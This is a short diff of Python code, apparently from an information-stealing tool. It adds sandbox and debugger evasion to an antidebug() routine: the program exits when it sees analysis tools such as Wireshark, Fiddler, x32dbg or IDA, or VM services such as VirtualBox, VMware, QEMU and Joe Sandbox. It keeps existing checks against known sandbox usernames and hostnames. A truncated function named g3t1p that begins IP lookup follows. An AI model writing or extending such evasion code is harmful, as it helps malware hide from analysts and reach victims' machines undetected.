@@ -36,15 +36,22 @@ def antidebug():
 
     
     blackListedUsers = ['WDAGUtilityAccount','Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A','lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
+
+    blacklistedProcesses = ["Fiddler", "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
+
     username = getpass.getuser()
     hostname = socket.gethostname()
 
+    for process in psutil.process_iter():
+      if process.name().lower() in blacklistedProcesses:
+        sys.exit()
+
     if username in blackListedUsers:
         os.system('cls')
-        sys.exit("")
+        sys.exit()
     elif hostname in blackListedPCNames:
         os.system('cls')
-        sys.exit("")
+        sys.exit()
 antidebug()
 def g3t1p():
     ip = "None"
